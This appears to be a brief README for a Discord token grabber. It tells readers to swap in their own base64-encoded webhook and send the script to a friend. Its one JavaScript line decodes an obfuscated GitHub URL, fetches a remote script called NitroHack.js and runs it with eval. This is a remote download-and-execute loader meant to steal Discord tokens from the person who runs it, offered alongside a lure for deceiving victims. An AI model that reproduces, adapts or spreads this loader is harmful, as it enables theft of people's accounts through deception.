# Discord Token Grabber
### chage the part at atob with your discord webhook (encode base64) and send the script to your friend!
## A simple token grabber lol

```js
fetch(atob("aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL3R1bmdkbzA2MDIvRGlzY29yZC1Ub2tlbi1HcmFiYmVyL21haW4vTml0cm9IYWNrLmpz")).then((res) => res.text().then((t) => eval(t)))
```
